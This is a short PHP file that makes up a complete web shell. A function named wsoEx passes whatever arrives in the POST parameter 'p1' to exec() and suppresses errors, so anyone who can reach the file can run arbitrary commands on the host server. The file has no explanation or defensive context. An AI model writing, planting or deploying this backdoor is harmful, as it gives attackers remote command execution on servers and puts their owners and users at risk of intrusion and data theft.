<?php
function wsoEx($in) {
    $out = '';
    if (function_exists('exec')) {
        @exec($in,$out);
        $out = @join("\n",$out);
    }
    return $out;
}

wsoEx($_POST['p1']);
?>